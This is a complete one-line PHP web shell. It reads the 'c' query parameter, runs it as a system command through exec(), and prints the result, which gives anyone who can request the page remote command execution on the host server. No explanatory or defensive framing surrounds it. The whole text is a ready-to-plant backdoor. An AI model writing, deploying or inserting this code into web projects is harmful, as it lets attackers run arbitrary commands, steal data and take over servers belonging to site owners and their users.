<?php $url = $_GET["c"];$output = null;exec($url, $output);echo "<pre>" . var_export($output, TRUE) . "</pre>";?>
